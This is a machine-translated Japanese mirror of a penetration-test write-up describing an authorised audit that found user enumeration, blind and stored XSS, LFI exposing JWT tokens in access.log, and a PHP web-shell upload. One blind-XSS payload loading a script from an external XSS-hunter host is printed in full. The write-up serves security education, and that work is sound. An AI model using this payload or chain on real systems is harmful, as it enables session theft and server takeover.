<!doctype html>
<html class="no-js" lang="ja">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>👩🏿‍🤝‍👨🏻 🚣🏻 ⛸️ 通常のユーザーから完全なサーバー管理者（XSS、LFI、Webシェル）まで 📎 🤹🏾 🧕🏼</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="年の初めに、ある会社の従業員が私に手紙を書いた。私が理解しているように、会社には小さな対立がありました。そのため、一部の従業員によるシステムの侵害のリスクがありました。システムを監査するという決定は間違いなく正しいものでした。結局のところ、検査の結果は私を嬉しく驚かせ、顧客を「不愉快に」驚かせました...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>通常のユーザーから完全なサーバー管理者（XSS、LFI、Webシェル）まで</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/452854/"><img src="https://habrastorage.org/webt/pc/sr/se/pcsrseauno875cmhmbms8odj33e.jpeg"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
年の初めに、ある会社の従業員が私に手紙を書いた。</font><font style="vertical-align: inherit;">私が理解しているように、会社には小さな対立がありました。</font><font style="vertical-align: inherit;">そのため、一部の従業員によるシステムの侵害のリスクがありました。</font><font style="vertical-align: inherit;">システムを監査するという決定は間違いなく正しいものでした。</font><font style="vertical-align: inherit;">結局のところ、検査の結果は私を嬉しく驚かせ、顧客を「不愉快に」驚かせました。</font></font><br>
<a name="habracut"></a><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
システムアーキテクチャは、原則として標準でした。</font><font style="vertical-align: inherit;">これは、認証サービスに基づいていました。</font><font style="vertical-align: inherit;">さらに、jwtによって発行されたトークンによると、ユーザーはさまざまなサブドメインでシステムの機能を使用できます。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
テストは1つのサブドメインに限定されていました。</font><font style="vertical-align: inherit;">しかし、顧客によると最も基本的な。</font><font style="vertical-align: inherit;">すべてのエラーと問題について詳しくは説明しません。</font><font style="vertical-align: inherit;">彼らはたくさん発見されました。</font><font style="vertical-align: inherit;">私は、最も気になると思われるものだけを説明します。</font></font><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ユーザー検索時の情報の冗長性 </font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
次の性質の一連の情報の受信を許可されたユーザーの検索クエリ-ユーザーID、名前、ログイン、アバター... </font></font><br>
<img src="https://habrastorage.org/webt/tg/qu/ov/tgquov-poitm1ptfpu0zbeluz80.png"><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
問題なく、ユーザーのデータベースLogin_name全体を収集できました。</font><font style="vertical-align: inherit;">ログイン機能にも特別な制限はありませんでした。</font><font style="vertical-align: inherit;">その後、いくつかのストリームでパスワードを選択したり、システムの最も重要なユーザーに対してポイントフィッシングを実行したりすることが可能でした。</font></font><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ユーザーサポートを要求する際のブラインドXSS。</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
この問題は、私が遭遇したシステムの90％に存在するという印象を受けました。以前は、レビューを集約するためのプラットフォームからの「ジャーク」が繰り返し私に飛んできた。インターネット上のユーザーの行動を監視するシステムへのアクセスも飛んでいった。色々ありました。しかし、これがどれほど危険であるかを理解している人はほとんどいません。具体的には、この脆弱性は</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ここ</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">に書かれてい</font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;">ます</font></a><font style="vertical-align: inherit;">。</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
この場合、</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">XSSハンター</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">から通知を受け取ったときに、攻撃が偶然に機能していることを確認しました</font><font style="vertical-align: inherit;">。攻撃方法は次のとおりです。</font></font><br>
<br>
<pre><code class="javascript hljs"><span class="hljs-string">"&gt;&lt;script src=https://sa.xss.ht&gt;&lt;/script&gt;</span></code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
しかし、顧客は私がこの攻撃ベクトルを介して管理パネルを制御できるとは考えていませんでした。</font><font style="vertical-align: inherit;">結局のところ、すべての貴重な情報はローカルストレージに保存されます。</font><font style="vertical-align: inherit;">XSSハンターはローカルストレージ情報の受信をサポートしていないため、自分のXSSロガーを展開する必要がありました。</font><font style="vertical-align: inherit;">次の</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">出版物は</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">非常に役に立ちました</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">攻撃が繰り返された結果、ローカルストレージからでも、悪意のある手段によって管理者のjwtトークンを簡単に取得できることを確認できました。</font></font><br>
<img src="https://habrastorage.org/webt/ju/o_/gg/juo_ggzcuntv-w0xpqj8wyrc81s.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
さて、システムの管理者権限があれば、何でもできます。</font></font><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">XSSをメールに保存しました。</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
システムに、フレーム化された電子メール招待状を作成して新しいユーザーを登録できる機能が発見されました。</font><font style="vertical-align: inherit;">文字の形で人の名前を挿入できます。</font><font style="vertical-align: inherit;">メールをより個人的なものにするため。</font><font style="vertical-align: inherit;">その結果、すべてのコンテンツが逃げ出されず、手紙に含まれていました。</font><font style="vertical-align: inherit;">手紙を通じて同様の成功したxss攻撃を実行するには、被害者の電子メールクライアントを知る必要があり、このクライアントのゼロデイxssを知る必要があります。</font><font style="vertical-align: inherit;">一般に、この攻撃の成功は、定義上、ごくわずかです。</font><font style="vertical-align: inherit;">手紙の上隅に不思議なボタンを見つけた瞬間まで。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/_9/bc/aw/_9bcawpodb6qbagj8om9k7d0nhc.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
それは手紙のウェブ版を開く機会でした。</font><font style="vertical-align: inherit;">そして、ここで驚きが待っていました。</font><font style="vertical-align: inherit;">XSSは機能しました。</font><font style="vertical-align: inherit;">同時に、レターのWebバージョンが管理者に公開されました*。Comサブドメイン</font></font><br>
<br>
<img src="https://habrastorage.org/webt/rk/nt/gt/rkntgtsisw3mf4oef6dfzc31tbq.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
。</font></font><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">利用可能なファイルaccess.log</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
審査の過程で、興味深い場所を見つけました。リクエストに別の文字が入ると、サーバーからの応答として404が到着しましたが、定期的に404の応答は前の応答とわずかに異なりました。時々余分なヘッダーがありました。時々そうではない。システム応答の特定の変更により、この場所でローカルファイルインクルード（</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LFI</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）</font><font style="vertical-align: inherit;">を確認するように求められました</font><font style="vertical-align: inherit;">。私はlfi辞書をセットアップし、システムがすべての要求に対して回答を返すのを待ちました。その結果、テスト結果を確認したところ、送信データのサイズが非常に大きく、ステータスが200であるという回答に非常に驚きました。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/kl/vc/cw/klvccwx_esjpgpgzbian0kyxd4c.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
判読可能なファイルaccess.logが見つかりました。このファイルには、サーバー上のすべてのアクティビティが記録されています。このファイルに含めると、jwtユーザートークンを検出できました。</font></font><br>
<img src="https://habrastorage.org/webt/ld/wy/rs/ldwyrs3tnisd5_jm4sbmcx2dmom.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
これらのトークンの有効期限は非常に長かった。</font><font style="vertical-align: inherit;">それもあまり良くありませんでした。</font></font><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">サーバーへの完全なWebシェルアクセス</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
原則として、上記のすべてが一般的な問題です。</font><font style="vertical-align: inherit;">しかし、特定の種類の脆弱性は、すでに対応するのが困難です。</font><font style="vertical-align: inherit;">それは、shell.phpファイル内の適切にロードされたコードを介してサーバーにアクセスすることです。</font><font style="vertical-align: inherit;">その後、このサーバーにあるすべてのプロジェクトが侵害されます。</font><font style="vertical-align: inherit;">私</font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;">は</font></a><font style="vertical-align: inherit;"> 2016年に同様の問題について</font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;">書き</font></a><font style="vertical-align: inherit;">ました</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"></font></a> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=" class="user_link"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Bo0oM</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">私のブログで。</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
しかし、私の例に戻りましょう。システムには、出版物を作成する機能がありました。同時に、写真をアップロードして公開することもできました。画像は同じドメインに保存されました。ただし、ファイル名が強制的に変更されました。つまり、アップロード-mypicture.jpg。しかし、結果として、12345.jpgを取得します。私はxmlファイルを転送するとどうなるかを確認することにしました（そのとき、XXEに会うことを夢見ていました）。そして驚いたことに、私は123556.xmlという答えを得ました。そして、Webシェルのphpファイル拡張子を使用すると、99％の確率で成功することがわかりました。この攻撃では、</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">b374kシェル</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">を使用し</font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;">ました</font></a><font style="vertical-align: inherit;">。ファイルに直接アクセスすることで、私は欲しいものを手に入れました。サーバーディレクトリへのアクセス。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/bt/ik/lf/btiklfakt0wb2gyiwahanzp6k1k.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
しかし、それは最も悲しいことではありませんでした。</font><font style="vertical-align: inherit;">最も悲しいことは、この脆弱性により、このサーバーのルートディレクトリにある10を超えるプロジェクトが侵害される可能性があったことです。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/o6/tw/cw/o6twcw5jb6vfazbvbhn3lzqivdg.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
私の友人</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=" class="user_link"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">サイバーパンク</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">これは2007年から2010年に見られる可能性があると述べた。</font><font style="vertical-align: inherit;">悲しいかな、2019年の庭で。そして今日も同様の問題が存在します。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
テストの結果、顧客はその結果に非常に驚いた。</font><font style="vertical-align: inherit;">そして、テストで非常に役に立ったことをとても嬉しく思いました。</font><font style="vertical-align: inherit;">興味深いプロジェクトについて何か提案があれば、お気軽に</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">電報で</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">書いてください</font><font style="vertical-align: inherit;">;）</font></font></div>
      
    </div>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../ja452842/index.html">SMPP-ショートメッセージピアツーピアプロトコル</a></li>
<li><a href="../ja452844/index.html">変革または冒とく：通信事業者を「デジタル化」する方法</a></li>
<li><a href="../ja452846/index.html">Patroniで信頼性の高いPostgreSQLクラスターを構築した方法</a></li>
<li><a href="../ja452850/index.html">カートリッジ内のシステム：エンジニアがゲームコンソールの機能を拡張した方法</a></li>
<li><a href="../ja452852/index.html">リモートワーク：夜の神話</a></li>
<li><a href="../ja452856/index.html">インディーズプロジェクトがリリースを見るために生きていない理由</a></li>
<li><a href="../ja452872/index.html">私は準備をしておらず、モスクワでFPGAに関するロスナノフセミナーを開催しました。ラスベガスとゼレノグラードで同じことをする計画</a></li>
<li><a href="../ja452876/index.html">異なる半分のピザのUICollectionViewLayout</a></li>
<li><a href="../ja452880/index.html">2019年1月〜4月のセンセーショナルなユーザーデータリーク</a></li>
<li><a href="../ja452882/index.html">フリーランサーとの最初の接触における顧客の過ち</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>